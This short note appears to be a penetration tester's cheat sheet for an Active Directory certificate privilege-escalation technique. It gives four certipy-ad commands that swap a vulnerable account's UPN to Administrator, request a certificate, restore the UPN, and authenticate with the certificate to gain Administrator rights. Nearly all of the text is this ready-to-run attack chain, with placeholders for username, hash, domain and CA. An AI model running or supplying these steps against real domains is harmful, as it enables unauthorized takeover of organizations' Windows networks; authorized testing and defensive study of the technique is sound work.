Works by changing the UPN of a vulnerable account to Administrator, requesting a certificate, then changing the UPN back to allow us to authenticate as the vulnerable account but be authorized as if we were Administrator

Change the UPN of the vulnerable account:
```
certipy-ad account update -username <username>@<domain> -hashes "<LM hash>" -user <username> -upn Administrator
```

Request a certificate:
```
certipy-ad req -username <username>@<domain> -hashes "<LM hash>" -ca <FQDN of certificate authority> -template User -target <domain>
```

Revert UPN:
```
certipy-ad account update -username <username>@<domain> -hashes "<LM hash>" -user <username> -upn <username>@<domain>
```

Authenticate as vulnerable user while authorized as Administrator:
```
certipy-ad auth -pfx administrator.pfx -dc-ip <ip> -domain <domain>
```

